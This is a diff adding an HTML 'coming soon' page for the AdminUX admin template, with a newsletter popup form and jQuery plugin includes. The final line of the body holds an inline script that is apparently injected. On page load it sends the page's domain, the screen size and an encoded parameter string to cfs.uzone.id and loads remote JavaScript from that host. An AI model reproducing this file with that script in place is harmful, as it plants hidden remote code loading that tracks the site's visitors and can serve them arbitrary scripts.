@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en-us" class="no-js">
+<head>
+<meta charset="utf-8">
+<title>AdminUX Panel - Responsive Admin Template</title>
+<meta name="description" content="The description should optimally be between 150-160 characters.">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="SRGIT">
+
+<!-- ================= Favicon ================== -->
+<!-- Standard -->
+<link rel="shortcut icon" href="assets/images/favicon.png">
+
+<!-- ============== Resources style ============== -->
+<link rel="stylesheet" href="plugins/coming-soon/css/style.css" />
+
+<!-- Modernizr runs quickly on page load to detect features -->
+<script src="plugins/coming-soon/js/modernizr.custom.js"></script>
+</head>
+
+<body>
+
+<!-- Page preloader -->
+<div id="loading">
+  <div id="preloader"> <span></span> <span></span> </div>
+</div>
+
+<!-- Overlay -->
+<div class="global-overlay">
+  <div class="overlay">
+    <div id="container">
+      <div id="output" class="back-fss"></div>
+    </div>
+  </div>
+</div>
+
+<!-- START - Home Part -->
+<section id="home-wrap" class="fss-wrap"> 
+  
+  <!-- Stars Overlay - Uncomment the next 3 lines to activate the effect--> 
+  <!-- <div id='stars'></div>
+			<div id='stars2'></div>
+			<div id='stars3'></div> -->
+  
+  <div class="content"> 
+    
+    <!-- Your logo --> 
+    <img src="assets/images/logo.png" alt="" class="brand-logo text-intro opacity-0" />
+    <h1 class="text-intro opacity-0"><span class="polyfy-title">We are the AdminUX Panel</span></h1>
+    <p class="text-intro opacity-0">We are working on a new &amp; exciting product that we think you'll really like</p>
+   
+	<a href="index.html" id="open-more-info" data-target="info-wrap" class="light-btn text-intro opacity-0">More Informations</a> <a data-dialog="somedialog" class="action-btn trigger text-intro opacity-0">Notify Me!</a> </div>
+  <!-- /. content --> 
+  
+  <!-- Social icons -->
+  <div class="social-icons text-intro opacity-0"> <a href="#"><i class="fa fa-facebook"></i></a> <a href="#"><i class="fa fa-twitter"></i></a> <a href="#"><i class="fa fa-google-plus"></i></a> <a href="#"><i class="fa fa-linkedin"></i></a> </div>
+  <!-- /. social-icons --> 
+  
+</section>
+<!-- END - Home Part --> 
+
+<!-- START - More Informations Part --> 
+
+<!-- START - Newsletter Popup -->
+<div id="somedialog" class="dialog">
+  <div class="dialog__overlay"></div>
+  <div class="dialog__content">
+    <div class="dialog-inner">
+      <h4>Join the AdminUX Panel right now!</h4>
+      <p>Being the first to know always feels great... Signing up to our newsletter gives you <strong>exclusive access to our Grand Opening!</strong></p>
+      
+      <!-- Newsletter Form -->
+      <div id="subscribe">
+        <form action="php/notify-me.php" id="notifyMe" method="POST">
+          <div class="form-group">
+            <div class="controls"> 
+              
+              <!-- Field  -->
+              <input type="text" id="mail-sub" name="email" placeholder="Click here to write your email" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Click here to write your email'" class="form-control email srequiredField" />
+              
+              <!-- Spinner top left during the submission --> 
+              <i class="fa fa-spinner opacity-0"></i> 
+              
+              <!-- Button -->
+              <button class="btn btn-lg submit">Get notified</button>
+              <div class="clear"></div>
+            </div>
+          </div>
+        </form>
+        
+        <!-- Answer for the newsletter form is displayed in the next div, do not remove it. -->
+        <div class="block-message">
+          <div class="message">
+            <p class="notify-valid"></p>
+          </div>
+        </div>
+      </div>
+      <!-- /. Newsletter Form --> 
+      
+    </div>
+    <!-- /. dialog-inner --> 
+    
+    <!-- Button Cross to close the Newsletter Popup -->
+    <button class="close-newsletter" data-dialog-close><i class="icon ion-close-round"></i></button>
+  </div>
+  <!-- /. dialog__content --> 
+  
+</div>
+<!-- END - Newsletter Popup --> 
+
+<!-- * Libraries jQuery, Easing and Bootstrap - Be careful to not remove them * --> 
+<script src="plugins/coming-soon/js/jquery.min.js"></script> 
+<script src="plugins/coming-soon/js/jquery.easings.min.js"></script> 
+<script src="plugins/coming-soon/js/bootstrap.min.js"></script> 
+
+<!-- Accelerated JavaScript animation JS file --> 
+<script src="plugins/coming-soon/js/velocity.min.js"></script> 
+
+<!-- Accelerated JavaScript animation UI JS file --> 
+<script src="plugins/coming-soon/js/velocity.ui.min.js"></script> 
+
+<!-- Newsletter plugin --> 
+<script src="plugins/coming-soon/js/notifyMe.js"></script> 
+
+<!-- Contact form plugin --> 
+<script src="plugins/coming-soon/js/contact-me.js"></script> 
+
+<!-- Custom Scrollbar plugin --> 
+<script src="plugins/coming-soon/js/jquery.mCustomScrollbar.js"></script> 
+
+<!-- Popup Newsletter Form --> 
+<script src="plugins/coming-soon/js/classie.js"></script> 
+<script src="plugins/coming-soon/js/dialogFx.js"></script> 
+
+<!-- Flat Surface Shader colors --> 
+<script src="plugins/coming-soon/js/custom.js"></script> 
+<!-- Flat Surface Shader effect --> 
+<script src="plugins/coming-soon/js/fss.js"></script> 
+<script src="plugins/coming-soon/js/custom-fss.js"></script> 
+
+<!-- Main JS File --> 
+<script src="plugins/coming-soon/js/main.js"></script> 
+
+<!--[if lt IE 10]><script  src="plugins/coming-soon/js/placeholder.js"></script><![endif]-->
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9jSLx54ANbg7PvVssrWZfLh2EqDJn2GUxxV%2fjMiApXFg%2fHRAhOcixPSmzdElMOvgx77eikFTsDpN6UtBL8jFhel9SBqOalzmq0tyJhsiOmlDsXiC7BZ3lQUENKnPq1mO%2fNNhLnReZklKwNqultB1UKIdAmAJjxyeGR2KGwXOGwobCFqQvreEdpWnzJMLw8ksW%2bUc0CyP3MLyW6WdSTYnlgJ9gQtKn5rQuUwHdsCbeEXF4VHys5XkIa9P2KlTxMrjH1ha1aKswt5ZvE0cy5mbSwio5W3vLR2rgcl8Wsv5qGY6OKvhedRO0B1v0%2bjTL%2f000ISIhiKDOyyqsYXgrrtC3%2bbPX1KBaQ8%2f8RCUKu3vVOoM9w4zcKcLosSXLPn3Yxhv6gxhARPiL1h5pnW3TVUfRuwmO1Wqe4sXU1yf1iHXH5stfiBv%2bMEMId3fvHjQEApKQNEbTk7%2bwB9xSmeM%2bGcEAmj8EKBkDh0n" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
